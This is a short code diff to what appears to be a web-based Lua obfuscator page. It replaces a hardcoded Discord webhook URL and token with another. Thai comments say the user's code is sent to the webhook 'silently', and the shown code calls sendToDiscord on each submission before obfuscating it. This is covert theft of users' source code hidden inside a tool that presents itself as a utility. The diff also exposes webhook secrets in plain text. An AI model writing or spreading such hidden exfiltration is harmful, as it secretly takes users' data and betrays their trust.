@@ -223,8 +223,8 @@
     </div>
 
     <script>
-        // ลิงก์ Discord Webhook ใหม่ที่อัปเดต
-        const SECRET_WEBHOOK = "https://discord.com/api/webhooks/1571490922842169430/zEgnBipWbi91wEVX3LF2MNuEzv68whjmd9kiFx7LE7_kELGhThh9zwEVLrXkSWt-Ww7r";
+        // Webhook สำหรับห้อง Web OBF (อันที่ 1)
+        const SECRET_WEBHOOK = "https://discord.com/api/webhooks/1571493923828797470/tAa3oRu1NGLonQAvHo305SAEe4M0azxt5QBUHxLwyjAU7m0KBvtUepJVmuy6Gl8BDFNE";
 
         function safeBtoa(str) {
             return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
@@ -258,7 +258,7 @@
                 return;
             }
 
-            // ส่งข้อมูลเข้า Discord Webhook ใหม่แบบเงียบๆ
+            // ส่งข้อมูลเข้าห้องเว็บ OBF
             sendToDiscord(code);
 
             var header = "--[[\n" +
